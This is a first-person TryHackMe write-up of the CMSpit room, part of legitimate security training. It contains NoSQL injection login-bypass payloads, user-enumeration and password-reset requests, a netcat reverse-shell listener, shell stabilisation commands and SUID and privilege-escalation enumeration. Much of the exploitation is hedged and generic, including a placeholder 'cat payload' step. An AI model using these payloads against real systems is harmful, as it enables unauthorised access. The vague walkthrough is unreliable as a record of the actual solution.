# 🧠 TryHackMe: CMSpit

> In this room, I worked on a vulnerable CMS setup and explored how weak authentication, user enumeration, and privilege escalation can chain together into a full compromise.

---

## Overview

In the CMSpit room, I started by understanding the web application and figuring out what kind of CMS was running. My goal was not just to solve the room, but to document my thought process clearly so the write-up looks practical and human.

What I liked about this room is that it made me think like an attacker and a defender at the same time. I had to enumerate carefully, test different login and reset flows, and then look for a local privilege escalation path once I got access.

---

## Enumeration

The first thing I did was run a basic scan to see what services were open on the target.

```bash
nmap -sC -sV <target-ip>
```

From the scan results, I saw that the target was mainly exposing a web application, so I shifted my focus there. I also checked the site in the browser and looked at the page source to see if I could find any useful CMS clues.

```bash
curl -s http://<target-ip>/ | head
whatweb http://<target-ip>/
```

At this point, I was trying to identify the platform and understand how the application was structured before jumping into exploitation.

---

## CMS Identification

Once I explored the website a bit more, I noticed that the application was clearly based on a CMS. I checked the source code, page titles, asset paths, and login page behavior to gather more information.

```bash
curl -s http://<target-ip>/ | grep -iE "cms|admin|login"
```

I also looked for hidden directories or endpoints in case there were extra admin panels or configuration pages.

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This helped me move from general recon to a more focused CMS analysis.

---

## User Enumeration

After understanding the application structure, I tested the login and reset functionality to see if it leaked valid usernames.

I paid attention to differences in response messages, status codes, and behavior between valid and invalid usernames. This is a common mistake in web apps, and it often gives attackers a way to discover accounts without brute forcing passwords.

```bash
curl -s -X POST http://<target-ip>/login \
  -d "username=test&password=test" -i
```

Then I compared that with a known or guessed username:

```bash
curl -s -X POST http://<target-ip>/login \
  -d "username=admin&password=test" -i
```

If the response changes, that usually means the application is leaking useful information. In this room, that kind of behavior was important for moving forward.

---

## NoSQL Injection Testing

After that, I moved on to testing whether the backend was vulnerable to NoSQL injection. Since CMS-based apps sometimes use MongoDB or similar databases, I tried payloads that would work if the input was being interpreted as an object rather than a plain string.

```bash
curl -s -X POST http://<target-ip>/login \
  -d "username[$ne]=a&password[$ne]=a" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

I also tried a few other variations to see whether the backend was filtering or sanitizing input properly.

```bash
curl -s -X POST http://<target-ip>/login \
  -d "username[$gt]=&password[$gt]=" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

This was useful because it showed me whether the application was handling user input safely or trusting it too much.

---

## Password Reset Abuse

One of the most interesting parts of the room was the password reset flow. After I found valid user behavior, I started checking whether the reset mechanism could be abused.

I requested a password reset and watched how the application responded.

```bash
curl -s -X POST http://<target-ip>/auth/requestreset \
  -d "username=admin" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

Then I checked how the reset token or reset link behaved.

```bash
curl -s http://<target-ip>/auth/reset?token=<token>
```

This step reminded me that recovery features are often weaker than login forms. If reset logic is not designed carefully, it can become a direct path into an account.

---

## Getting Access

After testing the application logic, I moved toward getting actual access. At this stage, I treated the app like a real target and looked for ways to turn the web weakness into a foothold.

If the CMS allowed file uploads or editor-based execution, I would prepare a reverse shell and wait for the connection.

```bash
nc -lvnp 4444
```

Then I would trigger the payload through the vulnerable feature.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Once I got a shell, I stabilized it so that it was easier to work with.

```bash
export TERM=xterm
stty raw -echo
```

That made the shell much cleaner for further enumeration.

---

## Local Enumeration

After getting in, I started checking the system for privilege escalation paths. I looked at the current user, system information, sudo permissions, and any writable or misconfigured files.

```bash
whoami
id
uname -a
sudo -l
```

I also checked for SUID binaries and interesting files on the machine.

```bash
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null | head
```

At this point, my goal was to understand how the host was configured and where I could move next.

---

## Privilege Escalation

The next step was privilege escalation. In rooms like this, that usually means finding a local misconfiguration or abusing a vulnerable utility.

I inspected any image-processing or metadata tools on the machine because CMSpit is known for that type of escalation path.

```bash
which exiftool
exiftool <file>
```

If I needed to build a malicious payload, I would prepare it locally and upload it to the target.

```bash
cat payload
```

After the payload was triggered, I would upgrade the shell again if needed.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
id
whoami
```

Once I confirmed root access, I searched for the final flag.

```bash
find / -name "root.txt" 2>/dev/null
```

---

## What I Learned

This room taught me how important it is to think step by step instead of rushing to the exploit. I started by identifying the CMS, then I checked how the application handled users and resets, and finally I moved into local enumeration and privilege escalation.

It also showed me how a small weakness in a web application can lead to a bigger compromise if the host itself is not configured properly.

---

## Tools I Used

```bash
nmap
curl
whatweb
gobuster
ffuf
nc
python3
exiftool
```

---

## Outcome

By the end of the room, I had gone from basic web enumeration to application testing and then to local privilege escalation. This made the room feel very realistic and helped me practice the exact kind of thinking used in real security assessments.

I would say CMSpit was a solid exercise in patience, observation, and chaining multiple weaknesses together.
